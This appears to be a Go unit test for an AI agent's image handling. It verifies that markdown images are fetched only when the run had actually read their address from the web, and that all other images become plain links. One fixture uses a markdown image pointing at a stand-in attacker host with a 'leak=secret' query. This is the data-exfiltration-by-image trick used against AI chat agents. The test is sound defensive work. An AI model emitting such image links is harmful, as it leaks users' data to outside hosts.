package agent

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"prism/internal/tools"
)

// A markdown image in an answer becomes a saved picture only when its address came from web content this run
// read; everything else stays a plain link (the chat never loads a remote image by itself).
func TestMarkdownImagesAreEmbeddedOnlyWhenTheRunSawTheAddress(t *testing.T) {
	h := newHarness(t)
	var fetched []string
	h.e.Tools.Register(&tools.Tool{Name: "image_fetch", Description: "stub", Risk: tools.RiskWrite, Auto: true, Params: tools.Obj("url", tools.Str("url", "u")),
		Run: func(ctx context.Context, env *tools.Env, raw json.RawMessage) (string, error) {
			var a struct{ URL string }
			_ = json.Unmarshal(raw, &a)
			if strings.Contains(a.URL, "broken") {
				return "", errors.New("not a picture")
			}
			fetched = append(fetched, a.URL)
			return "Saved cat.png. Put [image:77] in your reply", nil
		}})
	src := &tools.Sources{}
	src.NoteResult("results: https://cdn.example.com/cat.png and https://cdn.example.com/broken.png")
	src.Note("the agent typed https://evil.example.net/?leak=secret itself") // typed by the agent: never counts as seen
	in := "Here you go:\n![a sleepy cat](https://cdn.example.com/cat.png)\nand ![tracker](https://evil.example.net/?leak=secret)\nand ![bad](https://cdn.example.com/broken.png)"
	out := h.e.embedWebImages(context.Background(), in, src, "Atlas")
	if !strings.Contains(out, "[image:77]") || !strings.Contains(out, "_a sleepy cat_") {
		t.Fatalf("a seen address becomes a saved picture with its caption: %q", out)
	}
	if strings.Contains(out, "![") {
		t.Fatalf("no markdown image may survive: %q", out)
	}
	if !strings.Contains(out, "[tracker](https://evil.example.net/?leak=secret)") || len(fetched) != 1 {
		t.Fatalf("an address the run never read must stay a plain link and must not be fetched: %q fetched=%v", out, fetched)
	}
	if !strings.Contains(out, "[bad](https://cdn.example.com/broken.png)") {
		t.Fatalf("a failed fetch falls back to a link: %q", out)
	}
	// no sources at all (the run read nothing from the web): every image is only a link
	if got := h.e.embedWebImages(context.Background(), "![x](https://cdn.example.com/cat.png)", nil, "Atlas"); got != "[x](https://cdn.example.com/cat.png)" {
		t.Fatalf("without sources: %q", got)
	}
	// text without images is untouched, and at most a few pictures are fetched
	if got := h.e.embedWebImages(context.Background(), "plain text", src, "Atlas"); got != "plain text" {
		t.Fatalf("plain: %q", got)
	}
	fetched = nil
	many := strings.Repeat("![p](https://cdn.example.com/cat.png)\n", 7)
	h.e.embedWebImages(context.Background(), many, src, "Atlas")
	if len(fetched) != maxEmbeddedImages {
		t.Fatalf("at most %d pictures per answer, fetched %d", maxEmbeddedImages, len(fetched))
	}
}
